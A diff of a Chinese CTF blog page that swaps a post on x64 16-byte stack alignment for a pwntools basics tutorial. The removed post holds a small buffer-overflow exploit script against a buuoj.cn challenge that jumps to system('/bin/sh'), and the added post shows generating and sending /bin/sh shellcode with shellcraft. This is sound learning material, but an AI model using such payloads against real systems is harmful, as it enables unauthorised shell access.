@@ -18,30 +18,26 @@
   <meta name="author" content="0P1N">
   <meta name="keywords" content="">
   
-    <meta name="description" content="在刷buu pwn第一题的时候就碰到了这个问题，查到的writeup几乎没有真正解决这个问题的，对新手来说十分的劝退，找到的相关文章也比较难懂，针对性不强，所以做个记录。    1234567891011#exploitfrom pwn import*p&#x3D;remote(&amp;#x27;node4.buuoj.cn&amp;#x27;,25348)payload &#x3D; b&amp;#x27;a&amp;#x27; * 15 +">
+    <meta name="description" content="一、实验名称pwntools的基本用法 二、实验目的和要求1.掌握pwntools的基本使用方法2.掌握如何编写exploit 三、实验内容1.Process2.Attach3.Shellcraft 四、实验环境（软、硬件环境，主要仪器设备）Linux操作系统，pwntools 五、实验数据记录1.交互本地：sh&#x3D;process(“.&#x2F;2.dms”)远程：sh&#x3D;rem">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn中的x64汇编的16字节对齐和堆栈平衡例子">
-<meta property="og:url" content="https://lkliki.github.io/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/index.html">
+<meta property="og:title" content="pwntools基本使用">
+<meta property="og:url" content="https://lkliki.github.io/2022/09/22/pwntools%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="0P1N">
-<meta property="og:description" content="在刷buu pwn第一题的时候就碰到了这个问题，查到的writeup几乎没有真正解决这个问题的，对新手来说十分的劝退，找到的相关文章也比较难懂，针对性不强，所以做个记录。    1234567891011#exploitfrom pwn import*p&#x3D;remote(&amp;#x27;node4.buuoj.cn&amp;#x27;,25348)payload &#x3D; b&amp;#x27;a&amp;#x27; * 15 +">
+<meta property="og:description" content="一、实验名称pwntools的基本用法 二、实验目的和要求1.掌握pwntools的基本使用方法2.掌握如何编写exploit 三、实验内容1.Process2.Attach3.Shellcraft 四、实验环境（软、硬件环境，主要仪器设备）Linux操作系统，pwntools 五、实验数据记录1.交互本地：sh&#x3D;process(“.&#x2F;2.dms”)远程：sh&#x3D;rem">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://lkliki.github.io/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/1.png">
-<meta property="og:image" content="https://lkliki.github.io/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/2.png">
-<meta property="og:image" content="https://lkliki.github.io/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/3.png">
-<meta property="og:image" content="https://lkliki.github.io/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/4.png">
-<meta property="article:published_time" content="2022-09-11T13:36:01.000Z">
-<meta property="article:modified_time" content="2022-09-11T13:46:54.668Z">
+<meta property="article:published_time" content="2022-09-22T07:15:19.000Z">
+<meta property="article:modified_time" content="2022-09-22T07:15:54.314Z">
 <meta property="article:author" content="0P1N">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="basic">
 <meta property="article:tag" content="pwn">
-<meta property="article:tag" content="x64汇编">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://lkliki.github.io/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/1.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>pwn中的x64汇编的16字节对齐和堆栈平衡例子 - 0P1N</title>
+  <title>pwntools基本使用 - 0P1N</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -233,7 +229,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="pwn中的x64汇编的16字节对齐和堆栈平衡例子"></span>
+            <span id="subtitle" data-typed-text="pwntools基本使用"></span>
           
         </div>
 
@@ -244,8 +240,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-09-11 21:36" pubdate>
-          2022年9月11日 晚上
+        <time datetime="2022-09-22 15:15" pubdate>
+          2022年9月22日 下午
         </time>
       </span>
     
@@ -256,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          2.2k 字
         
       </span>
     
@@ -267,7 +263,7 @@
         
         
         
-          9 分钟
+          19 分钟
         
       </span>
     
@@ -313,34 +309,36 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">pwn中的x64汇编的16字节对齐和堆栈平衡例子</h1>
+            <h1 style="display: none">pwntools基本使用</h1>
             
             
               <div class="markdown-body">
                 
-                <p>在刷buu pwn第一题的时候就碰到了这个问题，查到的writeup几乎没有真正解决这个问题的，对新手来说十分的劝退，找到的相关文章也比较难懂，针对性不强，所以做个记录。</p>
-<p><img src="/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
-<p><img src="/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
-<p><img src="/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#exploit</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25348</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">15</span> + p64(<span class="hljs-number">0x401186</span>)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
-
-<p>按理来说，把返回地址覆盖成了shellcode的地址，不会有问题，但是这里出错了，没成功</p>
-<p>只要跳过push rbp</p>
-<p>，把payload改成</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload =<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">15</span> + <span class="hljs-string">&quot;b&quot;</span> * <span class="hljs-number">8</span>+p64(<span class="hljs-number">0x401186</span>+<span class="hljs-number">1</span>)  <span class="hljs-comment">#从mov rbp, rsp开始</span><br></code></pre></td></tr></table></figure>
-
-<p>或</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload =<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">15</span> + <span class="hljs-string">&quot;b&quot;</span> * <span class="hljs-number">8</span>+p64(<span class="hljs-number">0x401186</span>+<span class="hljs-number">4</span>)  <span class="hljs-comment">#从lea rdi,command开始</span><br></code></pre></td></tr></table></figure>
-
-<p>都不会出问题</p>
-<p>所以问题出在push rbp中</p>
-<p>原理：x64调用约定</p>
-<p>在x64调用约定中栈需要<strong>16字节对齐</strong>，正常情况下call调用函数前栈指针（rsp）指向的地址是0x10的整数倍，即最后一位是0，然后call命令向栈中压入的返回地址，占8个字节即8位地址（一位地址存一个byte），push rbp保存原始帧指针（rbp），又压入8字节，于是栈指针指向的地址又回到了0x10的整数倍，然后不论是开辟局部变量空间还是保存寄存器环境（因为RCX、RDX、R8、R9四个寄存器刚好是32个字节，是16字节对齐的）</p>
-<p>tips：如果开启canary保护，用来检测的cookie不是push进去的，所以不影响rsp的对齐</p>
-<p><img src="/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
-<p>所以在上面的题目中被溢出的函数的retn执行完后堆栈已经平衡并且对齐，这时省略了call的步骤直接跳到fun函数，<strong>返回地址没有被压进去</strong>，如果从push rbp开始执行的话，压入rbp后<strong>rsp就指向了最后一位是8的地址，不满足16字节对齐</strong>，而之后在不对齐的情况下call就出了问题。</p>
-<p>这个程序本身是没法正常执行完的，system(&#x2F;bin&#x2F;sh)执行，调用shell，我们用完shell退出后，执行fun函数中的retn时已经没有返回地址了，所以执行流会返回到错误的地方，大概率不是代码段，程序就奔溃了，但在崩溃前，我们已经用shell做完了我们要做的事。</p>
-<p>所以归根结底pwn不能硬套公式，还是要自己调试，有扎实的基本知识和分析能力才行</p>
+                <h3 id="一、实验名称"><a href="#一、实验名称" class="headerlink" title="一、实验名称"></a>一、实验名称</h3><p>pwntools的基本用法</p>
+<h3 id="二、实验目的和要求"><a href="#二、实验目的和要求" class="headerlink" title="二、实验目的和要求"></a>二、实验目的和要求</h3><p>1.掌握pwntools的基本使用方法<br>2.掌握如何编写exploit</p>
+<h3 id="三、实验内容"><a href="#三、实验内容" class="headerlink" title="三、实验内容"></a>三、实验内容</h3><p>1.Process<br>2.Attach<br>3.Shellcraft</p>
+<h3 id="四、实验环境（软、硬件环境，主要仪器设备）"><a href="#四、实验环境（软、硬件环境，主要仪器设备）" class="headerlink" title="四、实验环境（软、硬件环境，主要仪器设备）"></a>四、实验环境（软、硬件环境，主要仪器设备）</h3><p>Linux操作系统，pwntools</p>
+<h3 id="五、实验数据记录"><a href="#五、实验数据记录" class="headerlink" title="五、实验数据记录"></a>五、实验数据记录</h3><h4 id="1-交互"><a href="#1-交互" class="headerlink" title="1.交互"></a>1.交互</h4><p>本地：sh&#x3D;process(“.&#x2F;2.dms”)<br>远程：sh&#x3D;remote(“127.0.0.1”,10001)<br>（1）127.0.0.1表示本地测验，实际题目容器会给定IP地址和端口，连接即可。<br>（2）只要使用了process，最后一定要加上interactive才能完成交互过程。<br>（3）关闭远程连接使用sh.close()</p>
+<h4 id="2-I-x2F-O模块"><a href="#2-I-x2F-O模块" class="headerlink" title="2.I&#x2F;O模块"></a>2.I&#x2F;O模块</h4><p>(1)发送模块<br>A.sendline表示发送一行数据，相当于在数据后面加\n<br>B.sh.send（data）进行数据发送，不一定是一行数据<br>(2)接收模块<br>A.recv语句–numb表示接收的字节，timeout指定超时时间限制<br>parameter&#x3D;”&#x2F;bin&#x2F;sh” p.sendline(parameter)<br>B.recvuntil表示接收数据直到设置的标志出现，此处即直到“here:”出现<br>p.recvuntil(“here:”)<br>搭配使用如下：</p>
+<h4 id="3-Shellcode生成器"><a href="#3-Shellcode生成器" class="headerlink" title="3.Shellcode生成器"></a>3.Shellcode生成器</h4><p>结合asm-汇编与反汇编模块可以自动生成shellcode，得到最终的payload<br>（1）asm()函数接收一个字符串作为参数，可以得到汇编码的机器代码如：</p>
+<p>disasm与其相反如：disaasm(’’)<br>（2）shellcraft模块包含一些生成shellcode的函数，A.shellcraft.arm 是ARM架构的，<br>B.shellcraft.amd64是AMD64架构，<br>C.shellcraft.i386是Intel 80386架构的，<br>D.shellcraft.common是所有架构通用的。<br>此处：shellcraft.sh()是执行&#x2F;bin&#x2F;sh的shellcode。它的位置如下：</p>
+<h4 id="4-elf文件操作"><a href="#4-elf文件操作" class="headerlink" title="4.elf文件操作"></a>4.elf文件操作</h4><p>context是pwntools用来设置环境的功能，由于二进制文件的情况不同，需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。<br>一般来说我们设置context只需要简单的一句话:<br>context(os&#x3D;‘linux’, arch&#x3D;‘amd64’, log_level&#x3D;‘debug’)<br>这句话的意思是：<br>a. os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux<br>b. arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’<br>c. log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的i&#x2F;o过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和I&#x2F;O相关的错误。</p>
+<h4 id="5-context"><a href="#5-context" class="headerlink" title="5.context"></a>5.context</h4><p>context 是 pwntools 用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p>
+<p>一般来说我们设置context只需要简单的一句话:</p>
+<p>context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)</p>
+<p>或者 context(os&#x3D;’linux’, arch&#x3D;’amd64’)</p>
+<p>这句话的意思是：</p>
+<p>1)os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux</p>
+<p>2)arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’</p>
+<p>3)log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux</p>
+<h4 id="6-汇编与shellcode"><a href="#6-汇编与shellcode" class="headerlink" title="6.汇编与shellcode"></a>6.汇编与shellcode</h4><p>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用&#x2F;bin&#x2F;sh</p>
+<p>语句: shellcode &#x3D; asm(shellcraft.sh())</p>
+<p>print(asm(shellcraft.sh())) # 打印出汇编后的shellcode</p>
+<p>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。asm也是架构相关，所以一定要先设置context，避免一些意想不到的错误。</p>
+<p>使用方法即:</p>
+<p>context(os&#x3D;’linux’, arch&#x3D;’amd64(i386)’)</p>
+<p>shellcode &#x3D; asm(shellcraft.sh())</p>
+<p>p.sendline(shellcode)</p>
 
                 
               </div>
@@ -364,7 +362,7 @@
   
     <span>></span>
     
-  <a href="../../../../categories/pwn/x64%E6%B1%87%E7%BC%96/" class="category-chain-item">x64汇编</a>
+  <a href="../../../../categories/pwn/basic/" class="category-chain-item">basic</a>
   
   
 
@@ -381,9 +379,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="../../../../tags/pwn/">#pwn</a>
+        <a href="../../../../tags/linux/">#linux</a>
       
-        <a href="../../../../tags/x64%E6%B1%87%E7%BC%96/">#x64汇编</a>
+        <a href="../../../../tags/basic/">#basic</a>
+      
+        <a href="../../../../tags/pwn/">#pwn</a>
       
     </div>
   
@@ -395,8 +395,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>pwn中的x64汇编的16字节对齐和堆栈平衡例子</div>
-      <div>https://lkliki.github.io/2022/09/11/pwn中的x64汇编的16字节对齐和堆栈平衡例子/</div>
+      <div>pwntools基本使用</div>
+      <div>https://lkliki.github.io/2022/09/22/pwntools基本使用/</div>
     </div>
     <div class="license-meta">
       
@@ -408,7 +408,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年9月11日</div>
+          <div>2022年9月22日</div>
         </div>
       
       
@@ -438,18 +438,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="../../22/pwndbg%E5%91%BD%E4%BB%A4/" title="pwndbg命令">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">pwndbg命令</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="../python-z3/" title="python_z3">
-                        <span class="hidden-mobile">python_z3</span>
+                      <a href="../pwndbg%E5%91%BD%E4%BB%A4/" title="pwndbg命令">
+                        <span class="hidden-mobile">pwndbg命令</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
